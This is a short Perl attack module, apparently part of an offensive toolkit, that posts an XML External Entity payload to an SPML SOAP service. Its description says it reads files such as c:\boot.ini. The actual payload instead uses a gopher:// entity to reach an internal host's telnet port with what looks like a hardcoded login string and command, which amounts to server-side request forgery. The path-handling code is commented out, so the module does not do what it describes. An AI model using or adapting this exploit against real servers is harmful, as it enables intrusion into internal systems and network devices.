#!/usr/bin/perl
# Module Files Reading SPML service  (XML DOCTYPE)

# CONFIG
######################
my $desc ="SPML service (/spml/spmlservice) read files (XML External Entities) \n\t Usage: black.pl .. .. -m id_module <path> \n\t Path like this: c:\\boot.ini\n"; 
our $funcName="spml_doctype_readfile_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub spml_doctype_readfile_Func()
{
	
	my $XML="
<!DOCTYPE doc [ 
<!ENTITY foo SYSTEM 'gopher://172.16.0.254:23/aAlphanetworks\r\nwrgg19_c_dlwbr_dir300\r\n

help
'>
]> 
<doc>&foo;<doc>
	";
	
	
	# if ($ARGV[$m_arg_i+1]){
		# $path=$ARGV[$m_arg_i+1];
		# print $path." - path \n\n";
	# } else {
		# print "Error. Please, enter path name\n";
		# exit;
	# }

	
	$XML=~s/%PATH%/$path/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1, '/spml/spmlservice');

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";

}